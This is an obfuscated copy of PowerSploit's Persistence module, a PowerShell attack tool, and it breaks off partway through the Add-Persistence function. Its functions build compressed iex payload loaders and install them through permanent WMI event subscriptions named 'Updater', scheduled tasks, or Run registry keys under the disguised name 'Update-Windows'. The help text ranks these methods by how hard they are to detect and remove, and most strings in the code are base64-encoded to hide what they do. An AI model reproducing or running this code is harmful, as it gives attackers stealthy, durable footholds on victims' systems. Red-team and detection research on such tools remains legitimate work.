function New-ElevatedPersistenceOption
{
<#
.SYNOPSIS

    Configure elevated persistence options for the Add-Persistence function.

    PowerSploit Function: New-ElevatedPersistenceOption
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION

    New-ElevatedPersistenceOption allows for the configuration of elevated persistence options. The output of this function is a required parameter of Add-Persistence. Available persitence options in order of stealth are the following: permanent WMI subscription, scheduled task, and registry.

.PARAMETER PermanentWMI

    Persist via a permanent WMI event subscription. This option will be the most difficult to detect and remove.

    Detection Difficulty:        Difficult
    Removal Difficulty:          Difficult
    User Detectable?             No

.PARAMETER ScheduledTask

    Persist via a scheduled task.

    Detection Difficulty:        Moderate
    Removal Difficulty:          Moderate
    User Detectable?             No

.PARAMETER Registry

    Persist via the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key. Note: This option will briefly pop up a PowerShell console to the user.

    Detection Difficulty:        Easy
    Removal Difficulty:          Easy
    User Detectable?             Yes

.PARAMETER AtLogon

    Starts the payload upon any user logon.

.PARAMETER AtStartup

    Starts the payload within 240 and 325 seconds of computer startup.

.PARAMETER OnIdle

    Starts the payload after one minute of idling.

.PARAMETER Daily

    Starts the payload daily.

.PARAMETER Hourly

    Starts the payload hourly.

.PARAMETER At

    Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.

.EXAMPLE

    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'

.EXAMPLE

    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup

.EXAMPLE

    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle

.LINK

    http://www.exploit-monday.com
#>

    [CmdletBinding()] Param (
        [Parameter( ParameterSetName = 'PermanentWMIDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]
        [Switch]
        ${aab497dd068647b8a6b3884c2e6601af},
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
        [Switch]
        ${a0df28f799304c08843cb3989609cee7},
        [Parameter( ParameterSetName = 'Registry', Mandatory = $True )]
        [Switch]
        ${bfc6f52cfedc4f2a9bfd185afe38c73c},
        [Parameter( ParameterSetName = 'PermanentWMIDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [Switch]
        ${bfba23cf4a3847a2ba47c59807b66d21},
        [Parameter( ParameterSetName = 'PermanentWMIDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [DateTime]
        ${c3e0a2af3f1c4ea18f97ff8170745963},
        [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
        [Switch]
        ${cc7ad13128254d2b817259d011a81537},
        [Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]
        [Parameter( ParameterSetName = 'Registry', Mandatory = $True )]
        [Switch]
        ${aac6e7631e3f4ca9a474a27d48d418dc},
        [Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]
        [Switch]
        ${e90ad1f8c8a0427eae4ffbac9bdb0bcc}
    )
    ${b0b6c50e0cdf49d197d90b6c83c82c87} = @{
        Method = ''
        Trigger = ''
        Time = ''
    }
    switch ($PSCmdlet.ParameterSetName)
    {
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBhAG4AZQBuAHQAVwBNAEkAQQB0AFMAdABhAHIAdAB1AHAA')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBhAG4AZQBuAHQAVwBNAEkA')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AFMAdABhAHIAdAB1AHAA')))
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBhAG4AZQBuAHQAVwBNAEkARABhAGkAbAB5AA==')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBhAG4AZQBuAHQAVwBNAEkA')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGkAbAB5AA==')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQA=')))] = ${c3e0a2af3f1c4ea18f97ff8170745963}
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBBAHQATABvAGcAbwBuAA==')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawA=')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AEwAbwBnAG8AbgA=')))
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawA=')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAEkAZABsAGUA')))
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBEAGEAaQBsAHkA')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawA=')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGkAbAB5AA==')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQA=')))] = ${c3e0a2af3f1c4ea18f97ff8170745963}
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGcAaQBzAHQAcgB5AA==')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGcAaQBzAHQAcgB5AA==')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AEwAbwBnAG8AbgA=')))
        }
    }
    ${c7e62b7eb22945b2a0d7c0c4d7a6a31c} = New-Object -TypeName PSObject -Property ${b0b6c50e0cdf49d197d90b6c83c82c87}
    ${c7e62b7eb22945b2a0d7c0c4d7a6a31c}.PSObject.TypeNames[0] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAcABsAG8AaQB0AC4AUABlAHIAcwBpAHMAdABlAG4AYwBlAC4ARQBsAGUAdgBhAHQAZQBkAFAAZQByAHMAaQBzAHQAZQBuAGMAZQBPAHAAdABpAG8AbgA=')))
    echo ${c7e62b7eb22945b2a0d7c0c4d7a6a31c}
}
function New-UserPersistenceOption
{
    [CmdletBinding()] Param (
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
        [Switch]
        ${a0df28f799304c08843cb3989609cee7},
        [Parameter( ParameterSetName = 'Registry', Mandatory = $True )]
        [Switch]
        ${bfc6f52cfedc4f2a9bfd185afe38c73c},
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [Switch]
        ${bfba23cf4a3847a2ba47c59807b66d21},
        [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
        [DateTime]
        ${c3e0a2af3f1c4ea18f97ff8170745963},
        [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
        [Switch]
        ${cc7ad13128254d2b817259d011a81537},
        [Parameter( ParameterSetName = 'Registry', Mandatory = $True )]
        [Switch]
        ${aac6e7631e3f4ca9a474a27d48d418dc}
    )
    ${b0b6c50e0cdf49d197d90b6c83c82c87} = @{
        Method = ''
        Trigger = ''
        Time = ''
    }
    switch ($PSCmdlet.ParameterSetName)
    {
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBBAHQATABvAGcAbwBuAA==')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawA=')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AEwAbwBnAG8AbgA=')))
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawA=')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAEkAZABsAGUA')))
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBEAGEAaQBsAHkA')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawA=')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGkAbAB5AA==')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQA=')))] = ${c3e0a2af3f1c4ea18f97ff8170745963}
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGcAaQBzAHQAcgB5AA==')))
        {
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHQAaABvAGQA')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGcAaQBzAHQAcgB5AA==')))
            ${b0b6c50e0cdf49d197d90b6c83c82c87}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGkAZwBnAGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AEwAbwBnAG8AbgA=')))
        }
    }
    ${c7e62b7eb22945b2a0d7c0c4d7a6a31c} = New-Object -TypeName PSObject -Property ${b0b6c50e0cdf49d197d90b6c83c82c87}
    ${c7e62b7eb22945b2a0d7c0c4d7a6a31c}.PSObject.TypeNames[0] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAcABsAG8AaQB0AC4AUABlAHIAcwBpAHMAdABlAG4AYwBlAC4AVQBzAGUAcgBQAGUAcgBzAGkAcwB0AGUAbgBjAGUATwBwAHQAaQBvAG4A')))
    echo ${c7e62b7eb22945b2a0d7c0c4d7a6a31c}
}
function Add-Persistence
{
    [CmdletBinding()] Param (
        [Parameter( Mandatory = $True, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        ${e18e08602cf4478b9d3d5c8b2b498a6e},
        [Parameter( Mandatory = $True, ParameterSetName = 'FilePath' )]
        [ValidateNotNullOrEmpty()]
        [Alias('Path')]
        [String]
        ${ab56d657cfc849ccbae01cd65d4f8c86},
        [Parameter( Mandatory = $True )]
        ${cc4057f43ec0452aa83a64356d7ea926},
        [Parameter( Mandatory = $True )]
        ${df8063b79a7a452ca1a2f7709c4fa2c5},
        [ValidateNotNullOrEmpty()]
        [String]
        ${e1647abadf884b208ff363b3ef33e4b0} = 'Update-Windows',
        [String]
        ${ab2ac24b21dc4f71b4d86e7442187839} = "$PWD\Persistence.ps1",
        [String]
        ${ab4b6662c9a54dfab855d3a54a5f34c8} = "$PWD\RemovePersistence.ps1",
        [Switch]
        ${cf9bd0c2aaee4219940dc2dd6ab44219},
        [Switch]
        ${a9f05a6260d64d84befdddce7da6437b}
    )
    Set-StrictMode -Version 2
    if (${cc4057f43ec0452aa83a64356d7ea926}.PSObject.TypeNames[0] -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAcABsAG8AaQB0AC4AUABlAHIAcwBpAHMAdABlAG4AYwBlAC4ARQBsAGUAdgBhAHQAZQBkAFAAZQByAHMAaQBzAHQAZQBuAGMAZQBPAHAAdABpAG8AbgA='))))
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABwAHIAbwB2AGkAZABlAGQAIABpAG4AdgBhAGwAaQBkACAAZQBsAGUAdgBhAHQAZQBkACAAcABlAHIAcwBpAHMAdABlAG4AYwBlACAAbwBwAHQAaQBvAG4AcwAuAA==')))
    }
    if (${df8063b79a7a452ca1a2f7709c4fa2c5}.PSObject.TypeNames[0] -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAcABsAG8AaQB0AC4AUABlAHIAcwBpAHMAdABlAG4AYwBlAC4AVQBzAGUAcgBQAGUAcgBzAGkAcwB0AGUAbgBjAGUATwBwAHQAaQBvAG4A'))))
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABwAHIAbwB2AGkAZABlAGQAIABpAG4AdgBhAGwAaQBkACAAdQBzAGUAcgAtAGwAZQB2AGUAbAAgAHAAZQByAHMAaQBzAHQAZQBuAGMAZQAgAG8AcAB0AGkAbwBuAHMALgA=')))
    }
    ${8d8d49797b5b494095bad3098d94ec73} = gi ${ab2ac24b21dc4f71b4d86e7442187839} -ErrorAction SilentlyContinue
    if (${8d8d49797b5b494095bad3098d94ec73} -and ${8d8d49797b5b494095bad3098d94ec73}.PSIsContainer)
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcAByAG8AdgBpAGQAZQAgAGEAIABmAGkAbABlACAAbgBhAG0AZQAgAHcAaQB0AGgAIAB0AGgAZQAgAFAAZQByAHMAaQBzAHQAZQBuAHQAUwBjAHIAaQBwAHQARgBpAGwAZQBQAGEAdABoACAAbwBwAHQAaQBvAG4ALgA=')))
    }
    ${8d8d49797b5b494095bad3098d94ec73} = gi ${ab4b6662c9a54dfab855d3a54a5f34c8} -ErrorAction SilentlyContinue
    if (${8d8d49797b5b494095bad3098d94ec73} -and ${8d8d49797b5b494095bad3098d94ec73}.PSIsContainer)
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcAByAG8AdgBpAGQAZQAgAGEAIABmAGkAbABlACAAbgBhAG0AZQAgAHcAaQB0AGgAIAB0AGgAZQAgAFIAZQBtAG8AdgBhAGwAUwBjAHIAaQBwAHQARgBpAGwAZQBQAGEAdABoACAAbwBwAHQAaQBvAG4ALgA=')))
    }
    ${6ec44f27fafd4f4081df07a619d3b5d3} = Split-Path ${ab2ac24b21dc4f71b4d86e7442187839} -ErrorAction Stop
    ${bb4042aa26d249b7b6511c0eca5de384} = Split-Path ${ab2ac24b21dc4f71b4d86e7442187839} -Leaf -ErrorAction Stop
    ${966f141aaef74dcaab3ffcd81c15f7b8} = ''
    ${188aaa68b84a471c8bc115bfaea60abf} = ''
    if (${6ec44f27fafd4f4081df07a619d3b5d3} -eq '')
    {
        ${966f141aaef74dcaab3ffcd81c15f7b8} = "$($PWD)\$(${bb4042aa26d249b7b6511c0eca5de384})"
    }
    else
    {
        ${966f141aaef74dcaab3ffcd81c15f7b8} = "$(rvpa ${6ec44f27fafd4f4081df07a619d3b5d3})\$(${bb4042aa26d249b7b6511c0eca5de384})"
    }
    ${12780249b85b47f6b2814bf8cdd82fcb} = Split-Path ${ab4b6662c9a54dfab855d3a54a5f34c8} -ErrorAction Stop
    ${bb4042aa26d249b7b6511c0eca5de384} = Split-Path ${ab4b6662c9a54dfab855d3a54a5f34c8} -Leaf -ErrorAction Stop
    if (${12780249b85b47f6b2814bf8cdd82fcb} -eq '')
    {
        ${188aaa68b84a471c8bc115bfaea60abf} = "$($PWD)\$(${bb4042aa26d249b7b6511c0eca5de384})"
    }
    else
    {
        ${188aaa68b84a471c8bc115bfaea60abf} = "$(rvpa ${12780249b85b47f6b2814bf8cdd82fcb})\$(${bb4042aa26d249b7b6511c0eca5de384})"
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBQAGEAdABoAA==')))])
    {
        $null = ls ${ab56d657cfc849ccbae01cd65d4f8c86} -ErrorAction Stop
        ${675e1081ca814260a8f2a0866f0d3c90} = [IO.File]::ReadAllText((rvpa ${ab56d657cfc849ccbae01cd65d4f8c86}))
    }
    else
    {
        ${675e1081ca814260a8f2a0866f0d3c90} = ${e18e08602cf4478b9d3d5c8b2b498a6e}
    }
    ${1408f8a6bb3246c78c37b8cee7559600} = ''
    ${5551831a2227477db4a61598ddf7fbc8} = ''
    ${50dd3889beaf444088a6e13beb8c3d8e} = ''
    ${d8effee50a3b401592d3653210566b62} = "''"
    ${f17dc4af4f9142bfa43c36189ff132e3} = ''
    ${5551831a2227477db4a61598ddf7fbc8} = "''"
    ${50dd3889beaf444088a6e13beb8c3d8e} = ''
    ${516bba0d0e5b4ca4ab825c6a9c4ef241} = ''
    ${e1f24fa15d1c4db89d15fca61ba29769} = ([Text.Encoding]::ASCII).GetBytes(${675e1081ca814260a8f2a0866f0d3c90})
    ${ef4b24abe87943a88ef76082d3166e5e} = New-Object IO.MemoryStream
    ${a14b542eec4e4d87994b58ae8e913be3} = New-Object IO.Compression.DeflateStream (${ef4b24abe87943a88ef76082d3166e5e}, [IO.Compression.CompressionMode]::Compress)
    ${a14b542eec4e4d87994b58ae8e913be3}.Write(${e1f24fa15d1c4db89d15fca61ba29769}, 0, ${e1f24fa15d1c4db89d15fca61ba29769}.Length)
    ${a14b542eec4e4d87994b58ae8e913be3}.Dispose()
    ${fbba6939cd024a8fb2af35fa08b9c46b} = ${ef4b24abe87943a88ef76082d3166e5e}.ToArray()
    ${ef4b24abe87943a88ef76082d3166e5e}.Dispose()
    ${dcf69cf59efe4edd99f4a6fab7aeca8a} = [Convert]::ToBase64String(${fbba6939cd024a8fb2af35fa08b9c46b})
    ${bdde8df95b13416abc69e7f89b90b98e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAA=='))) + "'${dcf69cf59efe4edd99f4a6fab7aeca8a}'" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=')))
    switch (${cc4057f43ec0452aa83a64356d7ea926}.Method)
    {
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBhAG4AZQBuAHQAVwBNAEkA')))
        {
            ${f17dc4af4f9142bfa43c36189ff132e3} = {
gwmi __eventFilter -namespace root\subscription -filter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA9ACcAVQBwAGQAYQB0AGUAcgAnAA==')))| Remove-WmiObject
gwmi CommandLineEventConsumer -Namespace root\subscription -filter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA9ACcAVQBwAGQAYQB0AGUAcgAnAA=='))) | Remove-WmiObject
gwmi __FilterToConsumerBinding -Namespace root\subscription | ? { $_.filter -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAcgA=')))} | Remove-WmiObject
            }
            switch (${cc4057f43ec0452aa83a64356d7ea926}.Trigger)
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AFMAdABhAHIAdAB1AHAA')))
                {
                    ${d8effee50a3b401592d3653210566b62} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBgACQARgBpAGwAdABlAHIAPQBTAGUAdAAtAFcAbQBpAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzACAAXwBfAEUAdgBlAG4AdABGAGkAbAB0AGUAcgAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIABgACIAcgBvAG8AdABcAHMAdQBiAHMAYwByAGkAcAB0AGkAbwBuAGAAIgAgAC0AQQByAGcAdQBtAGUAbgB0AHMAIABAAHsAbgBhAG0AZQA9ACcAVQBwAGQAYQB0AGUAcgAnADsARQB2AGUAbgB0AE4AYQBtAGUAUwBwAGEAYwBlAD0AJwByAG8AbwB0AFwAQwBpAG0AVgAyACcAOwBRAHUAZQByAHkATABhAG4AZwB1AGEAZwBlAD0AYAAiAFcAUQBMAGAAIgA7AFEAdQBlAHIAeQA9AGAAIgBTAEUATABFAEMAVAAgACoAIABGAFIATwBNACAAXwBfAEkAbgBzAHQAYQBuAGMAZQBNAG8AZABpAGYAaQBjAGEAdABpAG8AbgBFAHYAZQBuAHQAIABXAEkAVABIAEkATgAgADYAMAAgAFcASABFAFIARQAgAFQAYQByAGcAZQB0AEkAbgBzAHQAYQBuAGMAZQAgAEkAUwBBACAAJwBXAGkAbgAzADIAXwBQAGUAcgBmAEYAbwByAG0AYQB0AHQAZQBkAEQAYQB0AGEAXwBQAGUAcgBmAE8AUwBfAFMAeQBzAHQAZQBtACcAIABBAE4ARAAgAFQAYQByAGcAZQB0AEkAbgBzAHQAYQBuAGMAZQAuAFMAeQBzAHQAZQBtAFUAcABUAGkAbQBlACAAPgA9ACAAMgA0ADAAIABBAE4ARAAgAFQAYQByAGcAZQB0AEkAbgBzAHQAYQBuAGMAZQAuAFMAeQBzAHQAZQBtAFUAcABUAGkAbQBlACAAPAAgADMAMgA1AGAAIgB9ADsAYAAkAEMAbwBuAHMAdQBtAGUAcgA9AFMAZQB0AC0AVwBtAGkASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAGAAIgByAG8AbwB0AFwAcwB1AGIAcwBjAHIAaQBwAHQAaQBvAG4AYAAiACAALQBDAGwAYQBzAHMAIAAnAEMAbwBtAG0AYQBuAGQATABpAG4AZQBFAHYAZQBuAHQAQwBvAG4AcwB1AG0AZQByACcAIAAtAEEAcgBnAHUAbQBlAG4AdABzACAAQAB7ACAAbgBhAG0AZQA9ACcAVQBwAGQAYQB0AGUAcgAnADsAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFQAZQBtAHAAbABhAHQAZQA9AGAAIgBgACQAKABgACQARQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACkAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AbgBJAG4AdABlAHIAYQBjAHQAaQB2AGUAYAAiADsAUgB1AG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlAGwAeQA9ACcAZgBhAGwAcwBlACcAfQA7AFMAZQB0AC0AVwBtAGkASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAGAAIgByAG8AbwB0AFwAcwB1AGIAcwBjAHIAaQBwAHQAaQBvAG4AYAAiACAALQBDAGwAYQBzAHMAIABfAF8ARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBCAGkAbgBkAGkAbgBnACAALQBBAHIAZwB1AG0AZQBuAHQAcwAgAEAAewBGAGkAbAB0AGUAcgA9AGAAJABGAGkAbAB0AGUAcgA7AEMAbwBuAHMAdQBtAGUAcgA9AGAAJABDAG8AbgBzAHUAbQBlAHIAfQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAIgA=')))
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGkAbAB5AA==')))
                {
                    ${d8effee50a3b401592d3653210566b62} = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $(${cc4057f43ec0452aa83a64356d7ea926}.Time.ToString('HH')) AND TargetInstance.Minute = $(${cc4057f43ec0452aa83a64356d7ea926}.Time.ToString('mm')) GROUP WITHIN 60```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
                }
                default
                {
                    throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAGUAbABlAHYAYQB0AGUAZAAgAHAAZQByAHMAaQBzAHQAZQBuAGMAZQAgAG8AcAB0AGkAbwBuAHMAIABwAHIAbwB2AGkAZABlAGQAIQA=')))
                }
            }
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawA=')))
        {
